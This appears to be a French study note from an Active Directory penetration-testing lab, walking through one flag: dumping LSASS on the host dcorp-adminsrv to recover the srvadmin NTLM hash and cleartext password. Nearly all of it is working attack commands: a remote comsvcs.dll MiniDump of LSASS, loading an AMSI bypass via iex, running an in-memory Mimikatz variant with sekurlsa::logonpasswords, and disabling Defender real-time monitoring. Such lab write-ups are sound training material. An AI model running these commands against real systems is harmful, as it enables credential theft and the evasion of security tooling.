---
flag: 13
machine: dcorp-adminsrv
statut: à faire
technique: LSASS dump
LO: "[[LO07 - Session DA et escalade]]"
---
# F13 · NTLM/clair de srvadmin

> [!summary] Objectif
> Récupérer le hash NTLM (et si possible le mot de passe clair) du compte `srvadmin` depuis `dcorp-adminsrv`.

## Contexte
- **Étape attack flow** : post-LO7 — DA `svcadmin` obtenu, on rebondit sur `dcorp-adminsrv` (sous-objectif séparé refusé à `ciadmin`).
- **Ce qu'on a** : TGT `svcadmin` (Domain Admin) injecté en session courante via OverPass-the-Hash (voir [[LO07 - Session DA et escalade]] étape 8).
- **Ce qu'on cherche** : `srvadmin` NTLM + éventuel mot de passe clair (loggé récemment sur `dcorp-adminsrv` → présent dans LSASS).

## Solution

### Étape 1 : vérifier le TGT DA en session
```powershell
klist
# doit lister un TGT krbtgt/DOLLARCORP pour svcadmin
```

### Étape 2 : dump LSASS de dcorp-adminsrv (via PSSession DA)
```powershell
$s = New-PSSession -ComputerName dcorp-adminsrv
Invoke-Command -Session $s -ScriptBlock {
  $p = (Get-Process lsass).Id
  cmd /c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $p C:\Users\Public\lsass.dmp full"
}
Copy-Item -FromSession $s C:\Users\Public\lsass.dmp -Destination C:\AD\Tools\lsass-adminsrv.dmp
Remove-PSSession $s
```
→ Voir [[Cheatsheet - Post-exploitation]] pour la variante `SafetyKatz` directe et la logique dump.

### Étape 3 : parse en mémoire (mimikatz.exe bloqué par Defender local)
```powershell
iex (Get-Content C:\AD\Tools\Amsi-Byp.txt -Raw)
. C:\AD\Tools\Invoke-Mimi.ps1
Invoke-Mimi -Command '"sekurlsa::minidump C:\AD\Tools\lsass-adminsrv.dmp" "sekurlsa::logonpasswords"'
```
`logonpasswords` (vs `ekeys`) sort NTLM **et** le clair `wdigest`/`tspkg` si présent.

## Réponse

| Élément | Valeur |
|---------|--------|
| srvadmin NTLM | A REMPLIR DEPUIS LAB |
| srvadmin clair | A REMPLIR DEPUIS LAB |

## Pièges et OPSEC
- Sans TGT DA valide → `Invoke-Command` sur `dcorp-adminsrv` = `Access denied` (`ciadmin` n'y est **pas** admin).
- Défaut : Defender coupé sur `dcorp-adminsrv` d'abord (`Set-MpPreference -DisableRealtimeMonitoring $true`) sinon `comsvcs.dll MiniDump` peut être quarantiné.
- Le navigateur corrompt le `.dmp` — toujours `Copy-Item -FromSession` ou `iwr`, vérifier la taille.
- Event ID 4624 (logon) `svcadmin` sur `dcorp-adminsrv` + accès à `lsass` = signature bruyante.

## Refs
- [[Cheatsheet - Post-exploitation]]
- [[Cheatsheet - Lateral movement]]
- [[LO07 - Session DA et escalade]]
- [[Synthèse - Kerberos]]

[[Flags - Index]] · [[Journal - Index]]
